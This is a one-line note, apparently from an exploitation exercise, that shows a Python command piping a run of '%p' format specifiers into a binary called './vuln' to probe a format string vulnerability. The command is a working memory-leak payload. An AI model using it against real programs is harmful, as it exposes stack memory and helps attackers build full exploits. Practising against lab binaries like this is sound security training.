python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,20)]))" | ./vuln - format string vulnerability
